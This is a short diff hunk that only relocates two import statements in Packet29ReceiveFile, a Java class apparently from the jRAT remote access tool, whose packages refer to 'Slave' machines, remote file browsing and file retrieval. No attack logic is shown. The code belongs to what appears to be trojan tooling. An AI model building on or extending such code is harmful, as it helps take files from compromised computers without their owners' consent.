@@ -9,12 +9,12 @@ import javax.swing.JOptionPane;
 import pro.jrat.FileData;
 import pro.jrat.Slave;
 import pro.jrat.Traffic;
+import pro.jrat.common.io.FileIO;
+import pro.jrat.common.io.TransferListener;
 import pro.jrat.packets.outgoing.Packet21GetFile;
 import pro.jrat.ui.frames.FrameFileTransfer;
 import pro.jrat.ui.frames.FrameRemoteFiles;
 
-import com.redpois0n.common.io.FileIO;
-import com.redpois0n.common.io.TransferListener;
 
 
 public class Packet29ReceiveFile extends AbstractIncomingPacket {
